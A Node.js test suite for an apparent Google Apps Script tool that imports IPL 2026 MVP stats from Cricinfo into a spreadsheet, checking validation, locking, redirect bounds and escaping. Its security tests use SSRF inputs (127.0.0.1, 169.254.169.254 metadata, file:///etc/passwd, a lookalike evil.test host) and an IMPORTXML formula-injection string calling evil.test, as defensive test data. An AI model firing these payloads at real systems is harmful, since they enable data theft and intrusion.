import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import test from 'node:test';
import vm from 'node:vm';

const source = 'https://www.cricinfo.com/series/ipl-2026-1510719/most-valuable-players';
const code = await readFile(new URL('../integrations/google-sheets/Code.gs', import.meta.url), 'utf8');
const fixture = JSON.parse(await readFile(new URL('./fixtures/season-source.json', import.meta.url), 'utf8'));
const html = data => '<html><script type="application/json" id="__NEXT_DATA__">' + JSON.stringify(data ?? fixture) + '</script></html>';
const plain = value => JSON.parse(JSON.stringify(value));

class MockRange {
  constructor(sheet, row, col, rows = 1, cols = 1) { Object.assign(this, { sheet, row, col, rows, cols }); }
  getValue() { return this.sheet.cells[this.row - 1]?.[this.col - 1] ?? ''; }
  setValue(value) { return this.setValues([[value]]); }
  setValues(values) {
    assert.equal(values.length, this.rows); values.forEach(row => assert.equal(row.length, this.cols));
    this.sheet.writes.push(plain(values));
    values.forEach((row, r) => row.forEach((value, c) => {
      this.sheet.cells[this.row + r - 1] ??= [];
      this.sheet.cells[this.row + r - 1][this.col + c - 1] = value;
    }));
    return this;
  }
  setNumberFormat(format) { this.sheet.formats.push({ row: this.row, col: this.col, rows: this.rows, cols: this.cols, format }); return this; }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setWrap() { return this; }
}
class MockSheet {
  constructor(name) { this.name = name; this.cells = []; this.metadata = []; this.writes = []; this.formats = []; this.maxRows = 1000; }
  getRange(...args) { return new MockRange(this, ...args); }
  getDeveloperMetadata() { return this.metadata; }
  addDeveloperMetadata(key, value) { this.metadata.push({ getKey: () => key, getValue: () => value }); return this; }
  getSheetId() { return 42; }
  getLastRow() { for (let i = this.cells.length - 1; i >= 0; i--) if (this.cells[i]?.some(value => value !== '' && value !== undefined)) return i + 1; return 0; }
  getMaxRows() { return this.maxRows; }
  insertRowsAfter(_, count) { this.maxRows += count; return this; }
  setColumnWidth() { return this; }
  setFrozenRows() { return this; }
}
function environment() {
  const sheets = new Map([['Original notes', new MockSheet('Original notes')]]);
  sheets.get('Original notes').cells = [['Preserve this sheet']];
  const env = { sheets, requests: [], releaseCount: 0, locked: false, response: { status: 200, body: html(), headers: { 'Content-Type': 'text/html; charset=UTF-8' } } };
  const book = { getId: () => 'public-sheet-id', getSheetByName: name => sheets.get(name) ?? null,
    insertSheet: name => { const sheet = new MockSheet(name); sheets.set(name, sheet); return sheet; }, toast() {} };
  const context = vm.createContext({
    SpreadsheetApp: { getActiveSpreadsheet: () => book, flush() {}, getUi: () => ({ createMenu: () => ({ addItem() { return this; }, addToUi() {} }) }) },
    LockService: { getDocumentLock: () => ({ tryLock: () => !env.locked, releaseLock: () => { env.releaseCount++; } }) },
    Utilities: { newBlob: text => ({ getBytes: () => Array.from(new TextEncoder().encode(text)) }) },
    UrlFetchApp: { fetch: (url, options) => {
      env.requests.push({ url, options: plain(options) });
      const response = typeof env.response === 'function' ? env.response(url) : env.response;
      return { getResponseCode: () => response.status, getAllHeaders: () => response.headers ?? {},
        getContent: () => Array.from(new TextEncoder().encode(response.body ?? '')), getContentText: () => response.body ?? '' };
    } },
  });
  vm.runInContext(code, context);
  env.context = context;
  env.setup = () => context.pavilionSetup();
  env.refresh = () => context.pavilionRefresh();
  env.feed = () => sheets.get('Pavilion MVP Feed');
  env.config = () => sheets.get('Pavilion Config');
  return env;
}

test('script runs with Apps Script globals only and setup preserves original tabs, config and prior feed', () => {
  const env = environment();
  for (const name of ['URL', 'fetch', 'Buffer', 'setTimeout']) assert.equal(vm.runInContext('typeof ' + name, env.context), 'undefined');
  env.context.onOpen(); env.setup(); env.refresh();
  const prior = plain(env.feed().cells);
  env.config().getRange(2, 2).setValue(source.replace('1510719', '1449924'));
  env.setup();
  assert.deepEqual(plain(env.feed().cells), prior);
  assert.match(env.config().getRange(2, 2).getValue(), /1449924/);
  assert.deepEqual(env.sheets.get('Original notes').cells, [['Preserve this sheet']]);
  assert.equal(env.requests.length, 1, 'opening and setup never fetch automatically');
});

test('setup refuses existing unowned fixed-name tabs without overwriting or deleting anything', () => {
  const env = environment(); const existing = new MockSheet('Pavilion Config'); existing.cells = [['Personal data']]; env.sheets.set('Pavilion Config', existing);
  assert.throws(env.setup, /not managed by Pavilion/);
  assert.deepEqual(existing.cells, [['Personal data']]);
  assert.equal(env.sheets.has('Pavilion MVP Feed'), false);
});

test('complete observed MVP data retains full precision, negative values, blanks and repeated capture metadata', () => {
  const env = environment(); env.setup(); env.feed().writes = [];
  assert.equal(env.refresh(), 3);
  const rows = plain(env.feed().cells);
  assert.equal(rows[1][0], '1408688'); assert.equal(rows[1][1], 'Vaibhav Sooryavanshi'); assert.equal(rows[1][2], 1012.29);
  assert.equal(rows[3][2], -25.81); assert.equal(rows[3][4], 0); assert.equal(rows[3][5], '');
  rows.slice(1).forEach(row => { assert.equal(row[9], source); assert.equal(row[10], env.config().getRange(5, 2).getValue()); assert.equal(row[11], 3); });
  assert.match(rows[1][10], /^\d{4}-\d\d-\d\dT/);
  assert.equal(env.feed().writes.length, 1, 'one validated feed range replaces the previous contents');
  assert.ok(env.feed().formats.some(range => range.col === 10 && range.cols === 2 && range.format === '@'), 'provenance URL and UTC capture time remain literal text');
  assert.equal(env.requests[0].options.followRedirects, false);
  assert.deepEqual(env.requests[0].options.headers, { Accept: 'text/html' });
});

test('provider denial and malformed, incomplete or wrong-series data preserve all successful rows and capture time', () => {
  const env = environment(); env.setup(); env.refresh();
  const previous = plain(env.feed().cells); const captured = env.config().getRange(5, 2).getValue();
  const partial = structuredClone(fixture); partial.props.appPageProps.data.content.smartStats.total = 202;
  const duplicate = structuredClone(fixture); duplicate.props.appPageProps.data.content.smartStats.results[1].player.objectId = 1408688;
  const wrong = structuredClone(fixture); wrong.props.appPageProps.data.series.objectId = 1449924;
  for (const response of [{ status: 403, body: 'Access Denied' }, { status: 200, body: '<html>Not a table</html>' }, ...[partial, duplicate, wrong].map(data => ({ status: 200, body: html(data) }))]) {
    env.response = response; assert.throws(env.refresh, /last successful feed kept/);
    assert.deepEqual(plain(env.feed().cells), previous); assert.equal(env.config().getRange(5, 2).getValue(), captured);
    assert.match(env.config().getRange(3, 2).getValue(), /Not updated/);
  }
});

test('SSRF inputs and unsafe redirects never reach untrusted hosts', () => {
  const env = environment(); env.setup();
  for (const input of [source.replace('https:', 'http:'), source.replace('www.cricinfo.com', '127.0.0.1'), source.replace('www.cricinfo.com', 'www.cricinfo.com.evil.test'), source.replace('www.cricinfo.com', 'user@www.cricinfo.com'), source.replace('www.cricinfo.com', 'www.cricinfo.com:8080'), source.replace('/series/', '/private/'), 'file:///etc/passwd']) {
    assert.throws(() => env.context.pavilionValidateSource_(input));
  }
  for (const location of ['https://169.254.169.254/latest/meta-data/', 'https://evil.test/', source.replace('1510719', '1449924')]) {
    env.requests = []; env.response = { status: 302, headers: { Location: location } };
    assert.throws(env.refresh); assert.equal(env.requests.length, 1);
  }
});

test('official redirects are bounded and payloads larger than four MB are rejected', () => {
  const env = environment(); env.setup();
  env.response = () => env.requests.length === 1 ? { status: 302, headers: { Location: source.replace('www.cricinfo.com', 'www.espncricinfo.com') } } : { status: 200, body: html() };
  assert.equal(env.refresh(), 3); assert.equal(env.requests.length, 2);
  env.requests = []; env.response = { status: 302, headers: { Location: source } };
  assert.throws(env.refresh, /too many times/); assert.equal(env.requests.length, 4);
  env.response = { status: 200, headers: { 'Content-Length': '4000001' }, body: '' };
  assert.throws(env.refresh, /4 MB/);
});

test('untrusted player and team strings are escaped before writing while negative numbers remain numbers', () => {
  const changed = structuredClone(fixture);
  changed.props.appPageProps.data.content.smartStats.results[0].player.longName = '=IMPORTXML("https://evil.test","//x")';
  changed.props.appPageProps.data.content.smartStats.results[0].team.longName = '+COMMAND';
  const env = environment(); env.setup(); env.response = { status: 200, body: html(changed) }; env.refresh();
  assert.match(env.feed().cells[1][1], /^'=/); assert.equal(env.feed().cells[1][6], "'+COMMAND");
  assert.equal(env.feed().cells[3][2], -25.81);
});

test('document locks and a source edited during fetch prevent accidental overwrites', () => {
  const env = environment(); env.setup(); env.refresh(); const previous = plain(env.feed().cells);
  env.locked = true; const count = env.requests.length; assert.throws(env.refresh, /Another Pavilion/); assert.equal(env.requests.length, count);
  env.locked = false; env.response = () => { env.config().getRange(2, 2).setValue(source.replace('1510719', '1449924')); return { status: 200, body: html() }; };
  assert.throws(env.refresh, /Source URL changed/); assert.deepEqual(plain(env.feed().cells), previous);
});

test('a shorter complete update removes old trailing rows in the same validated write', () => {
  const env = environment(); env.setup(); env.refresh();
  const shorter = structuredClone(fixture); const stats = shorter.props.appPageProps.data.content.smartStats; stats.results = stats.results.slice(0, 1); stats.total = 1;
  env.feed().writes = []; env.response = { status: 200, body: html(shorter) }; env.refresh();
  assert.equal(env.feed().writes.length, 1); assert.equal(env.feed().cells[1][11], 1);
  assert.ok(env.feed().cells.slice(2).every(row => row.every(value => value === '')));
});
